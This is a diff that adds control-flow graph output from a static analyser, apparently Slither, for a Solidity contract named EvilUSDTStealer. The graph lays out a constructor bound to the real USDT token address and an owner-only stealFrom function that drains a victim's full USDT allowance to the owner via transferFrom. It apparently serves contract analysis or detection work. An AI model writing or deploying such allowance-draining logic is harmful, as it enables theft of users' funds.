@@ -1,0 +1,56 @@
+Contract: IERC20
+==================================================
+
+
+Contract: EvilUSDTStealer
+==================================================
+
+Function: constructor
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 1
+  Type: NodeType.EXPRESSION
+  Expression: owner = msg.sender
+
+  ID: 2
+  Type: NodeType.EXPRESSION
+  Expression: usdt = IERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7)
+
+Edges:
+  0 -> 1
+  1 -> 2
+
+Function: stealFrom
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 1
+  Type: NodeType.EXPRESSION
+  Expression: require(bool,string)(msg.sender == owner,Only owner can steal)
+
+  ID: 2
+  Type: NodeType.VARIABLE
+  Expression: amount = usdt.allowance(victim,address(this))
+
+  ID: 3
+  Type: NodeType.EXPRESSION
+  Expression: require(bool,string)(amount > 0,No USDT allowance)
+
+  ID: 4
+  Type: NodeType.EXPRESSION
+  Expression: usdt.transferFrom(victim,owner,amount)
+
+Edges:
+  0 -> 1
+  1 -> 2
+  2 -> 3
+  3 -> 4
+
+
